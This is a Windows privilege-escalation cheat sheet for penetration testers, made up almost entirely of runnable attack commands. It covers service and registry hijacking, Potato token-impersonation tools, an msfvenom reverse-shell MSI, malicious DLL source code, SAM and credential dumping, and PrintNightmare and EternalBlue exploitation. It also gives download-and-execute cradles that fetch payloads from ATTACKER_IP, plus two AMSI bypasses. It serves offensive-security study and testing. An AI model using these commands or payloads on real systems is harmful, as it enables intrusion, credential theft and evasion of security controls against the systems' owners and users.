---
icon: windows
---

# Windows Privilege Escalation

### Enumeration Checklist

```powershell
# System info
systeminfo
hostname
whoami
whoami /priv         # current privileges
whoami /groups       # group memberships

# Users and groups
net user
net user username
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

# Running processes
tasklist /v
tasklist /SVC        # processes and services

# Network info
ipconfig /all
netstat -ano
route print
arp -a

# Services
sc query
sc query type= all state= all
wmic service list brief

# Scheduled tasks
schtasks /query /fo LIST /v

# Startup programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Installed software
wmic product get name,version
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s

# Patches/hotfixes
wmic qfe list brief
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Environment variables
set

# AlwaysInstallElevated check
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

#### Automated Tools

```powershell
# WinPEAS
winpeas.exe
winpeas.bat

# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe all

# JAWS
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

# Sherlock (deprecated but useful)
Import-Module .\Sherlock.ps1
Find-AllVulns
```

***

### Service Exploits

#### Insecure Service Permissions

```powershell
# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula

# If service is modifiable by current user:
sc config SERVICENAME binPath= "C:\Windows\Temp\shell.exe"
sc start SERVICENAME
# or
sc stop SERVICENAME
sc start SERVICENAME
```

#### Weak Service Binary

```powershell
# Find service executable permissions
icacls "C:\path\to\service\binary.exe"

# If writable (M or F permissions for current user):
# Replace the binary with a payload
copy shell.exe "C:\path\to\service\binary.exe"

# Restart the service
sc stop SERVICENAME
sc start SERVICENAME
```

#### Unquoted Service Path

```powershell
# List services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Example vulnerable path:
# C:\Program Files\Vulnerable Service\service.exe
# Windows looks for:
# C:\Program.exe
# C:\Program Files\Vulnerable.exe      <-- place shell here
# C:\Program Files\Vulnerable Service\service.exe

# Create payload in writable directory along the path
copy shell.exe "C:\Program Files\Vulnerable.exe"
sc start VulnerableService
```

***

### Registry Exploits

#### Modifiable Registry Keys for Services

```powershell
# Find modifiable service registry keys
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services

# If modifiable, change ImagePath to payload
reg add HKLM\SYSTEM\CurrentControlSet\Services\SERVICENAME /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\shell.exe" /f

# Restart service
sc stop SERVICENAME
sc start SERVICENAME
```

#### AutoRun Registry Keys

```powershell
# Check AutoRun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# If writable, add your payload
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f

# Wait for admin to login, or reboot
```

***

### Scheduled Tasks

```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v

# Info about specific task
schtasks /query /tn "TaskName" /fo LIST /v

# Check permissions of task binary
icacls "C:\path\to\task\binary.exe"

# If writable, replace with payload
copy shell.exe "C:\path\to\task\binary.exe"

# Launch the task manually (if have permission)
schtasks /run /tn "TaskName"
```

***

### Startup Applications

```cmd
# Check startup directories
dir "%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir %userprofile%\Start Menu\Programs\Startup
dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

***

### Token Impersonation

#### Juicy Potato / Sweet Potato / Rogue Potato

> These attacks work when you have `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common with service accounts like IIS, SQL Server).

```powershell
# Check token privileges
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege

# Juicy Potato (Windows < 2019, not Server 2019+)
JuicyPotato.exe -l 1337 -c "{CLSID}" -p C:\Windows\Temp\shell.exe -a "/c cmd.exe"

# Sweet Potato (newer Windows)
SweetPotato.exe -a "whoami"

# Rogue Potato
RoguePotato.exe -r ATTACKER_IP -e "C:\Windows\Temp\shell.exe" -l 9999

# PrintSpoofer (Windows 10, Server 2019)
PrintSpoofer.exe -c "C:\Windows\Temp\shell.exe"
PrintSpoofer.exe -i -c cmd

# God Potato (newer, works on many versions)
GodPotato.exe -cmd "cmd /c whoami"
```

***

### AlwaysInstallElevated

> If both HKLM and HKCU keys are set to 1, any user can install MSI as SYSTEM.

```powershell
# Check registry keys
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi

# Install the MSI (runs as SYSTEM)
msiexec /quiet /qn /i shell.msi
```

***

### DLL Hijacking

> Windows searches for DLLs in a specific order. If you can place a malicious DLL in a higher-priority path, it gets loaded.

#### DLL Search Order

```
1. Application's own directory
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Current working directory
6. Directories in %PATH%
```

#### Finding DLL Hijacking Opportunities

```powershell
# Use Process Monitor (procmon.exe) to find "NAME NOT FOUND" DLL loads

# Or use PowerSploit
Find-DLLHijack
Find-PathDLLHijack

# Create malicious DLL (C code)
# evil.c:
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            system("C:\\Windows\\Temp\\shell.exe");
            break;
    }
    return TRUE;
}

# Compile
x86_64-w64-mingw32-gcc evil.c -shared -o evil.dll
```

***

### Credential Hunting

```powershell
# Search for passwords in files
findstr /si password *.txt *.ini *.xml *.config
findstr /spin "password" *.*

# Common config files
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep\sysprep.xml
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf

# Registry stored credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows Credential Manager
cmdkey /list
runas /savecred /user:DOMAIN\admin "cmd.exe /c type C:\Users\admin\Desktop\root.txt"

# SAM and SYSTEM hashes (need SYSTEM)
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
# Then extract offline with:
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL

# PowerShell history
type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# IIS credentials
C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config

# VNC passwords
reg query HKCU\Software\ORL\WinVNC3\Password
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

***

### CVEs & Kernel Exploits

#### Key Windows Privilege Escalation CVEs

| CVE            | Name                | Affected OS                        |
| -------------- | ------------------- | ---------------------------------- |
| CVE-2021-34527 | PrintNightmare      | Windows 7/8/10/2008/2012/2016/2019 |
| CVE-2021-1675  | Print Spooler LPE   | Windows 7/8/10/2008/2012/2016/2019 |
| CVE-2020-0796  | SMBGhost            | Windows 10 1903/1909               |
| CVE-2019-1458  | WizardOpium         | Windows 7/8.1/10/2008/2012         |
| CVE-2018-8453  | Win32k EoP          | Windows 8.1+                       |
| CVE-2018-8440  | ALPC EoP            | Windows 7/8.1/10/2008/2012/2016    |
| MS17-010       | EternalBlue         | Windows 7/2008/2003/XP             |
| MS16-135       | Kernel Mode Drivers | Windows 2016                       |

```powershell
# Check for MS17-010 (EternalBlue)
nmap -p 445 --script smb-vuln-ms17-010 $ip

# PrintNightmare
python3 CVE-2021-34527.py domain/user:password@$ip '\\ATTACKER\share\shell.dll'

# EternalBlue with Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $ip
set LHOST ATTACKER_IP
run
```

***

### PowerShell Techniques

#### Execution Policy Bypass

```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"

# Base64 encode command
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$b64 = [Convert]::ToBase64String($bytes)
powershell -enc $b64
```

#### Download and Execute

```powershell
# Download file
(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP/shell.exe", "C:\Temp\shell.exe")

# Download and execute in memory
IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/script.ps1")

# Or with curl
curl http://ATTACKER_IP/shell.exe -OutFile C:\Temp\shell.exe

# Certutil download
certutil.exe -urlcache -split -f http://ATTACKER_IP/shell.exe C:\Temp\shell.exe

# BITSAdmin
bitsadmin /transfer myJob /download /priority high http://ATTACKER_IP/shell.exe C:\Temp\shell.exe
```

#### AMSI Bypass

```powershell
# Simple AMSI bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Another method
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
